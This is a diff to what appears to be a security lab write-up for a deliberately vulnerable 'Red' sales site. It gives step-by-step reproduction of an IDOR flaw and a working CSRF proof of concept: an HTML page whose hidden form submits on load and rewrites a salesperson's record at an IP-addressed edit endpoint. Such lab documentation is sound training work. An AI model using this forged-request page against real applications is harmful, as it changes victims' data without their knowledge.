@@ -72,14 +72,39 @@ Description:
 Vulnerability #1: **Insecure Direct Object Reference (IDOR)**
 
 Description:
+  1. Navigate to the 'Find a Salesperson' tab
+  2. Select any salesperson
+  3. In the URL, go to the end and change the ID to 10 or 11
+  4. On the Red site, this will display informatoin that should only be accessible to a logged in user. If this attack is performed on the other two sites, they redirect to the main page.
 
 <img src="Red-IDOR.gif">
 
 Vulnerability #2: **Cross-Site Request Forgery (CSRF)**
 
 Description:
+  1. Go to the 'Salespeople' tab and view one of the salespeople. *There are no tokens used to identify an admin user on the Red site.* 
+  2. Use the following HTML page with a hidden form to modify a salesperson's data
+  ```
+<!DOCTYPE html>
+<html>
+  <head>
+	 <title>CSRF Page</title>
+  </head>
+  <body onload="document.CSRF.submit()">
+    <form action=https://35.184.88.145/red/public/staff/salespeople/edit.php?id=12 method="POST" name="CSRF">
+        <input type="text"   name="first_name"  value="Hacker"/>
+        <input type="text"   name="last_name"   value="Guyyy"/>
+        <input type="text"   name="phone"       value="123-456-7890"/>
+        <input type="text"   name="email"       value="hackerguyyy@gmail.com"/>
+    </form>
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+  </body>
+</html>
 
 <img src="Red-CSRF.gif">
+```
+3. When the page is opened in the browser, it changes the specified user on the actual Red site. 
+4. Return to the Red site and refresh the page. The salesperson's data should be changed.
 
 
 ## Notes
